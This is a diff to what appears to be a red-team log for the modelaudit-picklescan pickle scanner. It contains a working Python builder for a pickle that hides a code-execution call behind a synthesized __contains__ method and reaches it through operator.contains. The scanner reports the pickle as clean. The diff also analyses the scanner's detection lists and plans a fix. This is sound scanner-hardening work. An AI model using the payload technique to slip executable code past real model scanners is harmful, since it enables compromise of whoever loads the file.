@@ -3955,3 +3955,119 @@ Blocking plan:
 
 Performance note: one literal in the existing magic-method match arm, no
 rich-comparison flow modeling.
+
+## Turn 83 - `__contains__` membership method gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag, using a clean membership helper
+to invoke an attacker-controlled containment method during deserialization.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    if len(data) <= 0xFF:
+        return b"\x8c" + bytes([len(data)]) + data
+    return b"X" + len(data).to_bytes(4, "little") + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_operator_contains_dunder_contains_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("builtins", "type"),
+        b"(",
+        s("DerivedPath"),
+        sg("pathlib", "PosixPath"),
+        b"\x85",
+        b"}",
+        s("__contains__"),
+        sg("pathlib", "Path.touch"),
+        b"s",
+        b"tR\x940",
+        b"h\x00",
+        s(str(marker)),
+        b"\x85R\x940",
+        sg("operator", "contains"),
+        b"h\x01",
+        b"M" + (0o666).to_bytes(2, "little"),
+        b"\x86R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`, `notices=[]`
+- Coverage: `bytes_scanned=182`, `bytes_total=182`, `opcode_count=34`,
+  `raw_scan_complete=True`, `opcode_scan_complete=True`
+- Scanner import references: `builtins.type`, `pathlib.PosixPath`,
+  `pathlib.Path.touch`, and `operator.contains`, all with
+  `is_dangerous=False`
+- Control proof: the same pickle without the final `operator.contains` call
+  returns a `DerivedPath` instance at
+  `/tmp/ma_operator_contains_dunder_contains_marker` and does not create the
+  marker
+- Unpickle result: the full payload creates
+  `/tmp/ma_operator_contains_dunder_contains_marker` and returns `False`
+- RCE mechanism: the payload uses `type(...)` to create a `pathlib.PosixPath`
+  subclass with `__contains__ = pathlib.Path.touch`. Calling
+  `operator.contains(instance, 0o666)` dispatches to
+  `instance.__contains__(0o666)`, which calls
+  `Path.touch(instance, mode=0o666)`. Containment then coerces the `None`
+  result to `False`, so the side effect happens before `pickle.loads()`
+  returns without raising.
+
+Why the scanner missed it:
+
+- `__contains__` is not in the suspicious magic-method string list. Current
+  coverage includes serialization hooks, attribute hooks, `__call__`,
+  `__del__`, and `__eq__`, but not membership hooks.
+- `operator.contains` is absent from `DANGEROUS_GLOBALS`; current `operator`
+  coverage includes `call`, `attrgetter`, `itemgetter`, and `methodcaller`.
+- `builtins.type` and `pathlib.Path.touch` are clean; `pathlib` is not a
+  wildcard-dangerous module.
+- The payload uses only currently clean globals: `builtins.type`,
+  `pathlib.PosixPath`, `pathlib.Path.touch`, and `operator.contains`.
+- The dangerous callable is hidden as a synthesized containment method, so the
+  final visible call target is a common membership helper rather than the
+  attacker-selected callable.
+- The payload has no suspicious string seeds such as `eval(`, `exec(`,
+  `__import__`, `os.system`, `subprocess`, `__getattr__`,
+  `__getattribute__`, `__del__`, or `__eq__`.
+
+Performance note: this is a precise magic-method seed gap. The focused next
+block should add `__contains__` to the suspicious magic-method string list,
+with an oracle regression proving that class construction alone does not
+create the marker but `operator.contains(instance, 0o666)` does. This keeps
+the hot path to the existing string-literal policy scan and avoids membership
+flow modeling.
+
+## Turn 84 - Block `__contains__` membership seeds
+
+Blocking plan:
+
+- Add `__contains__` to the existing suspicious magic-method string list.
+  Membership hooks can route execution through containment dispatch rather
+  than an explicit dangerous call target.
+- Leave `operator.contains`, `builtins.type`, `pathlib.PosixPath`, and
+  `pathlib.Path.touch` allowed for this focused block. The static signal is
+  the attacker-controlled containment slot name.
+- Add a CPython oracle regression that builds the manual
+  `type(..., {"__contains__": Path.touch})` payload, verifies scan-time
+  detection on both the construction-only control and `operator.contains` RCE
+  variants, proves the control instance does not create the marker, then
+  proves the membership check creates the marker during `pickle.loads()`.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: one literal in the existing magic-method match arm, no
+membership-flow modeling.
